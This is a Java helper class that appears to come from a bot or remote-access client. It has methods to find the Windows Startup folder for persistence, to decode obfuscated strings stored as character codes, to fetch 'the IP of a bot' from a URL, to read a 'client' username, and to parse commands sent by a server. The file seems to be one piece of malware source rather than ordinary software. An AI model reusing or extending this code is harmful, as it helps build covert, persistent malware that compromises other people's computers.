import java.io.*;
import java.net.URI;
import java.net.URL;
import java.util.ArrayList;
import java.util.Random;
import javax.swing.JOptionPane;
/**
 * Misc class, for misc methods
 * @author Nathan
 *
 */

public class Misc
{
	/**
	 * Constructor
	 */
    public Misc()
    {
    }
    /**
     * Returns the startup location
     * @return
     */
    public static String findStartup()
    {
        if(System.getProperty("os.name").contains("xp"))
            return (new StringBuilder(String.valueOf(System.getProperty("user.home")))).append("\\Start Menu\\Programs\\Startup\\").toString();
        else
            return (new StringBuilder(String.valueOf(System.getProperty("user.home")))).append("\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\").toString();
    }
    /**
     * Returns a random number within the range max
     * @param max
     * @return
     */
    public static int randomNumber(int max)
    {
        return (new Random()).nextInt(max);
    }
    /**
     * Returns the location of this file
     * @return
     */
    public static String getJARLoc()
    {
        try
        {
            String str = Class.forName("Main").getResource("Main.class").toURI().toString();
            str = str.substring(0, str.lastIndexOf("!"));
            str = str.replaceAll("jar:file:/", "");
            File file = new File(new URI((new StringBuilder("file:/")).append(str).toString()));
            return file.getPath();
        }
        catch(Exception e)
        {
            return findStartup();
        }
    }
    /**
     * Decrypts the strings
     * @param s
     * @return
     */
    public static final String decrypt(String s)
    {
        String as[] = s.split(" ");
        StringBuilder stringbuilder = new StringBuilder();
        String as1[] = as;
        int i = as1.length;
        for(int j = 0; j < i; j++)
        {
            String s1 = as1[j];
            int k = Integer.parseInt(s1);
            stringbuilder.append((char)k);
        }

        return stringbuilder.toString();
    }
    /**
     * Returns the IP of a bot
     * @param url
     * @return
     */
    public static String getIPAddress(String url)
    {
        try
        {
            BufferedReader reader = new BufferedReader(new InputStreamReader((new URL(url)).openStream()));
            return reader.readLine();
        }
        catch(IOException ioe)
        {
            return (new StringBuilder("IOException thrown: ")).append(ioe.toString()).toString();
        }
    }
    /**
     * Gets the username of a client
     * @return
     */
    public static String getUsername()
    {
        String home = System.getProperty("user.home");
        if(home.endsWith("\\"))
            home = home.substring(0, home.length() - 1);
        return home.substring(home.lastIndexOf("\\") + 1);
    }
    /**
     * Splits Strings
     * @param command
     * @return
     */
    @SuppressWarnings("unchecked")
	public static String[] splitArgs(String command)
    {
        command = command.trim();
        ArrayList argsList = new ArrayList(15);
        int quotes = 0;
        int lastIndex = 0;
        for(int i = 0; i < command.length(); i++)
            if(command.substring(i, i + 1).equals("\""))
            {
                quotes++;
                if(i + 1 == command.length())
                    argsList.add(command.substring(lastIndex + 1, i + 1));
            } else
            if(command.substring(i, i + 1).equals(" "))
            {
                if(quotes == 0)
                {
                    int offset = lastIndex == 0 ? 0 : 1;
                    argsList.add(command.substring(lastIndex + offset, i));
                    lastIndex = i;
                } else
                if(quotes % 2 == 0)
                {
                    argsList.add(command.substring(lastIndex + 1, i));
                    lastIndex = i;
                }
            } else
            if(i + 1 == command.length())
            {
                int offset = lastIndex == 0 ? 0 : 1;
                argsList.add(command.substring(lastIndex + offset, i + 1));
            }

        argsList.trimToSize();
        Object objs[] = argsList.toArray();
        String args[] = new String[objs.length];
        for(int j = 0; j < objs.length; j++)
        {
            args[j] = (String)objs[j];
            args[j] = args[j].replaceAll("\"", "");
        }

        return args;
    }
    /**
     * Prints on a new line
     * @param ln
     */
    public static void print(String ln)
    {
    	if(Constants.DEBUG) {
        System.out.println(ln);
    	}
    }
    /**
     * Prints a server output
     * @param ln
     */
    public static void print_server(String ln)
    {
    	if(Constants.DEBUG) {
        System.out.println((new StringBuilder("$ Server Said:  ")).append(ln).append(" $").toString());
    	}
    }
    /**
     * Shows a message dialog
     * @param msg
     */
    public static void showMessageDialog(String msg)
    {
        JOptionPane.showMessageDialog(null, msg, "Message", -1);
    }

}